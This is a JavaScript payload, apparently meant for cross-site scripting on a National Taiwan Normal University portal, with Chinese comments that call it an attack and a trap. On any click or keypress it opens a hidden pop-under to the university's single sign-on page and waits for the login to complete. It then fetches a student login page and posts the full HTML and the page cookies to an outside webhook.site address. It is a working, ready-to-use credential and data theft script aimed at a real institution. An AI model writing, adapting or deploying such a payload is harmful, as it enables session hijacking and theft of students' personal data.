(async () => {
    const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
    const targetUrl = "/GuidanceApp/StdtLoginCtrl?PageType=1B"; 

    // 定義攻擊函數：只有在使用者點擊時才執行
    async function launchAttack() {
        // 1. 移除監聽器，確保只跑一次
        document.removeEventListener('click', launchAttack);
        document.removeEventListener('keydown', launchAttack);
        
        try {
            // 2. 在點擊事件內觸發彈窗 (瀏覽器會放行！)
            // 嘗試做成 Pop-under (縮小 + 移開 + 失去焦點)
            const popup = window.open(ssoUrl, "sso_trap", "width=100,height=100,left=9999,top=9999");
            
            if (popup) {
                // 嘗試讓彈窗躲到後面去
                try { popup.blur(); window.focus(); } catch(e) {}
                fetch(webhook + "?step=Popup_Launched_Success");
            } else {
                fetch(webhook + "?error=Popup_Still_Blocked");
                return;
            }

            // 3. 等待 SSO 完成 (6秒)
            await new Promise(r => setTimeout(r, 6000));

            // 4. 關閉彈窗
            try { popup.close(); } catch(e) {}

            // 5. 收割完整資料
            const response = await fetch(targetUrl);
            const fullHtml = await response.text();

            fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    msg: "FULL_DUMP_SUCCESS",
                    trigger: "User_Click",
                    status: response.status,
                    full_html_source: fullHtml, // 這裡是你需要的完整原始碼
                    cookies: document.cookie
                })
            });

        } catch (e) {
            fetch(webhook + "?error=" + encodeURIComponent(e.message));
        }
    }

    // === 佈署陷阱 ===
    // 監聽全域點擊事件，只要受害者點任何地方就會觸發
    document.addEventListener('click', launchAttack);
    document.addEventListener('keydown', launchAttack);

    // 通知你陷阱已就緒
    fetch(webhook + "?status=Trap_Ready_Waiting_For_Click");

})();